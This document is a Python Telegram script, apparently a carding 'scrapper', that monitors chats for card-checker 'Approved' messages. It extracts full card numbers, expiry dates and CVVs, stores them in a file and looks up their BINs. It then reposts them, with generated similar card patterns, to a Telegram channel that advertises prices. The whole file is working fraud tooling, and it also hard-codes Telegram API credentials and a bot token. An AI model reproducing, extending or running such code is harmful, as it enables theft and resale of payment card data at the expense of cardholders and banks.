from telethon import TelegramClient, events
import re
import telebot
import requests
import random
import asyncio
from colorama import Fore
from time import sleep
from os import system
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

api_id = 21219740
api_hash = 'd32d92cb34233c3b61b19d3651404f09'

client = TelegramClient('anon', api_id, api_hash)
client.parse_mode = 'html'

TokenAthena = "6415372090:AAFKUOqw1TZS2GZdzmADahqlIEv-61ustQQ"
id_channel_athena = -1001926125474
bot = telebot.TeleBot(TokenAthena, parse_mode="html")

def verificar(ccn):
    with open('tarjetas.txt', 'r') as f: r = f.read()
    if ccn in r:
        return True
    else: 
        return False
reply_markup = InlineKeyboardMarkup(
               [
                    [
                        InlineKeyboardButton( 
                            "𝙍𝙀𝙁𝙀𝙍𝙀𝙉𝘾𝙄𝘼𝙎",
                            url="https://t.me/+PUf_l7sVBF45NWYx"   
                        ),
                        InlineKeyboardButton( 
                            "𝙋𝙍𝙄𝘾𝙀",
                            url="https://t.me/c/1926125474/1605"  
                        
                        ),        #aca identificas los botones, como los nombraras etc
                    ],
                    [
                        InlineKeyboardButton( 
                            "𝙀𝙉𝙑𝙄𝙀 𝙎𝙐𝙎 𝙍𝙀𝙁𝙀𝙍𝙀𝙉𝘾𝙄𝘼𝙎",
                            url="t.me/Eltiomicha"  
                        
                        ),
                    ],
                ]
            )

            
        
                        
@client.on(events.NewMessage)                              
@client.on(events.MessageEdited)
async def my_event_handler(event):
    global resp
    text = event.raw_text 
   
    res = text.split()
    responses = ['Approved ✅','𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅','Payment Successful! ✅ ','Approved! ✅','𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 𝑪𝑪𝑵 ✅','Approved ✅','𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝒂𝒓𝒅 ✅','APPROVED ✅','VIVA ✅ ','𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅','Aprobada ✅','Approved! 🟩','CARD CCN! ✅','APPROVED ✅ ','✅Appr0ved','Approved','Auth Complete ✅','APPROVED ✓ ','Approved ✅','Approved!✅','𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ✅']
    if any(response in text for response in responses):
            
            x = re.findall(r'\d+', text)
 
              
            if len(x) == 0:
                
                return
            if len(x) == 1:
                
                return
            elif len(x) == 2:
                
                return
            elif len(x) == 3:
                
                return
            cc = x[0]
            mm = x[1]
            yy = x[2]
            cvv = x[3]
            if len(cc) > 16:
                return
            if len(mm) > 2:
                return
            if len(yy) > 4:
                return
            if len(cvv) > 4:
                return
            cxc = (f"{cc}")
            if mm.startswith('2'):
                mm, yy = yy, mm
            if len(mm) >= 3:
                mm, yy, cvv = yy, cvv, mm
            if len(cc) < 15 or len(cc) > 16:                
                return
            if len(yy) == 2:
                yy = '20'+yy
            tarj = f'{cc}|{mm}|{yy}|{cvv}'           
            v = verificar(cc)
            if v == True:
                return
            tarj = f'{cc}|{mm}|{yy}|{cvv}'
            with open('tarjetas.txt', 'a') as d:
                d.write(tarj+"\n")
            if 'Approved' == 'Approved':
                bin = cxc[0:6]
                rs = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()            
                country = rs["country"]
                flag = rs["country_flag"]
                bank = rs["bank"]
                brand = rs["brand"]
                type = rs["type"]
                level = rs["level"] 
                extra1 = (random.randrange(1000,9500,3))
                mes1 = (random.choice(("01","02","03","04","05","06","07","09","09","10","11","12")))
                year1 = (random.randint(2024, 2030))
                extra2 = cxc[0:12]
                xountry = country
                api = requests.get(f"https://randomuser.me/api/?nat={xountry}&inc=name,location").json()
                
                
                vbvr = random.randint(1,2)
                
                if vbvr == 1 or country == "MX" or bin == "499998":
                    res = ['CVV MATCHED!','Status code cvv: Gateway Rejected: cvv','Gateway Rejected: avs','Status code avs_and_cvv: Gateway Rejected: avs_and_cvv','Card Issuer Declined CVV','Approved']
                    resp = random.choice(res)
                    new2 = (f"""
<b><i>𝙈6𝙅 𝙎𝘾𝙍𝘼𝙋𝙋𝙀𝙍 [𝙁𝙍𝙀𝙀] </i></b>
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
𝘛𝘈𝘙𝘑𝘌𝘛𝘈 ⇰ ✽ <code>{cc}|{mm}|{yy}|{cvv}</code>
𝘙𝘌𝘚𝘗𝘜𝘌𝘚𝘛𝘈 ⇰ ✽ <b>Approved! ✅</b>
𝘌𝘟𝘛𝘙𝘈 1 ⇰ ✽ <code>{extra2}xxxx|{mm}|{yy}|rnd</code>
𝙀𝙓𝙏𝙍𝘼 2 ⇰ ✽{cxc[:8]}{extra1}xxxx|{mes1}|{year1}|rnd</code>
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
𝘉𝘐𝘕 ⇰ ✽ <b>{brand} {level} {type}</b>
𝘉𝘈𝘕𝘊𝘖 ⇰ ✽ <b>{bank}</b>
𝘗𝘈𝘐𝘚 ⇰ ✽ <b>{country} {flag}</b>
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
Owner ⇰ ♛ @GatoOnichan2 
""")
                #bot.send_message(id_channel_athena, text) 
                    img3 = "https://i.pinimg.com/originals/87/14/51/871451d9adfa14336730debc35a9355d.jpg"
                    
                    print(f"\n ✅ {Fore.LIGHTWHITE_EX}#Card Tested: {Fore.LIGHTBLUE_EX}{cc}|{mm}|{yy}|{cvv} {Fore.LIGHTWHITE_EX}/ {country}|{flag}\n" 
                             f"  {Fore.LIGHTWHITE_EX}#Seccesfully Sended - ID Channel: {Fore.LIGHTBLUE_EX}{id_channel_athena}")
                 
                    bot.send_photo(id_channel_athena,img3, new2, reply_markup=reply_markup)

                 
                elif vbvr == 2 or bin == "451015":
                    res = ['CVV MATCHED!','Status code cvv: Gateway Rejected: cvv','Gateway Rejected: avs','Status code avs_and_cvv: Gateway Rejected: avs_and_cvv','Card Issuer Declined CVV','Approved']
                    resp = random.choice(res)
                    sleep(40) 
                    pass
                
        
client.start()
client.run_until_disconnected()
